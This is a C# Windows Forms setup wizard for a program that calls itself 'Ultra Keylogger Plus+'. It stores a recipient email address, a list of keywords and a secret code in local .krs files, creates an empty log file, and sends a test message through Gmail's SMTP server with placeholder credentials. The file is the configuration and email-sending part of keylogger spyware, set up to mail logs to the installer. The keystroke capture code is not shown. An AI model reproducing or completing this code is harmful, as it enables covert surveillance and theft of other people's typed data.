using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace SetupWizard
{
    public partial class mainForm : Form
    {
        string email;
        string[] keywords;
        string secret;

        public mainForm()
        {
            InitializeComponent();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            codeTextBox.UseSystemPasswordChar = !checkBox1.Checked;
        }

        private void nextButton_Click(object sender, EventArgs e)
        {
            nextButton.Enabled = false;
            spinnerPicBox.Visible = true;

            email = emailTextBox.Text;
            emailTextBox.Enabled = false;

            keywords = keywordsTextBox.Lines;
            keywordsTextBox.Enabled = false;

            secret = codeTextBox.Text;
            codeTextBox.Enabled = false;

            setupBackgroundWorker.RunWorkerAsync();

            while (setupBackgroundWorker.IsBusy)
            {
                Application.DoEvents();
            }

            mainPanel.Controls.Clear();

            mainPanel.Controls.Add(new finish());
            
            this.Refresh();
        }

        private void setupBackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            writeFiles();
            sendEmail();
        }

        private void writeFiles()
        {
            StreamWriter emailWriter = new StreamWriter("./email.krs");
            emailWriter.WriteLine(email);
            emailWriter.Close();

            StreamWriter keywordWriter = new StreamWriter("./keywords.krs");
            foreach (string keyword in keywords)
            {
                keywordWriter.WriteLine(keyword);
            }
            keywordWriter.Close();

            StreamWriter secretWriter = new StreamWriter("./secret.krs");
            secretWriter.WriteLine(secret);
            secretWriter.Close();

            StreamWriter logWriter = new StreamWriter("./logs.krs");
            logWriter.Write("");
            logWriter.Close();
        }

        private void sendEmail()
        {
            MailAddress Send = new MailAddress("logsender@email.com", "UKP32+");
            MailAddress Recieve = new MailAddress(email);
            MailMessage message = new MailMessage(Send, Recieve);
            message.Sender = new MailAddress("logsender@email.com", "UKP32+");
            message.Subject = "Just Checking...";
            message.Body = "Hello!\n\nThis is an automated email sent from Ultra Keylogger Plus+.\n\nkthxbai";
            SmtpClient emailClient = new SmtpClient();
            emailClient.UseDefaultCredentials = false;
            emailClient.Credentials = new System.Net.NetworkCredential("logsender@email.com", "yourpassword");
            emailClient.Host = "smtp.gmail.com";
            emailClient.Port = 587;
            emailClient.EnableSsl = true;
            emailClient.Timeout = 20000;
            emailClient.Send(message);
        }
    }
}
